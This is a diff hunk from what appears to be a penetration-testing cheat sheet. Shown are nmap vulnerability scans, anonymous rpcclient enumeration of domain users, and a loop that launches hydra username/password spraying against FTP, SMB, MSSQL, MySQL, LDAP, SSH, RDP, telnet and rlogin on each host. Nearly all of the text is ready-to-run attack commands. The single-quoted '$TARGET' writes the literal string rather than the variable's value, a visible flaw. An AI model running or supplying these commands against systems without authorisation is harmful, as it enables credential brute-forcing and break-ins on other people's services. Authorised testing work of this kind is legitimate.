@@ -49,23 +49,27 @@ PORTS=$(cat *_$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf 
 (sudo nmap -Pn -n --script=vuln "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULN_$TARGET' &)
 (sudo nmap -Pn -n -sV "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VERSIONS_$TARGET' &)
 
-# RPC - Usernames
+## Create a hosts list
+echo '$TARGET' > hosts
+echo '$TARGET' > dc-hosts
+echo '$TARGET' > pc-hosts
+
+## RPC - Usernames
 for host in $(cat ~/dc-hosts); do echo "================[   $host   ]==============="; rpcclient -U "" $host -N -c "enumdomusers"; done
 for host in $(cat ~/dc-hosts); do rpcclient -U "" $host -N -c "enumdomusers"; done | grep -oP 'user:\[\K[^]]+'
 
 ## Spray Services
-echo '$TARGET' > $PROJECT/hosts
-for host in $(cat $PROJECT/hosts); do
-(hydra -I ftp://$host -L $PROJECT/usernames -P $PROJECT/passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I smb2://$host -L $PROJECT/usernames -P $PROJECT/passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I mssql://$host -L $PROJECT/usernames -P $PROJECT/passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I mysql://$host -L $PROJECT/usernames -P $PROJECT/passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ldap2://$host -L $PROJECT/usernames -P $PROJECT/passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ldap3://$host -L $PROJECT/usernames -P $PROJECT/passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ssh://$host -L $PROJECT/usernames -P $PROJECT/passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I rdp://$host -L $PROJECT/usernames -P $PROJECT/passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I telnet://$host -L $PROJECT/usernames -P $PROJECT/passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I rlogin://$host -L $PROJECT/usernames -P $PROJECT/passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+for host in $(cat hosts); do
+(hydra -I ftp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I smb2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I mssql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I mysql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I ldap2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I ldap3://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I ssh://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I rdp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I telnet://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I rlogin://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
 ; done
 
 ## Web
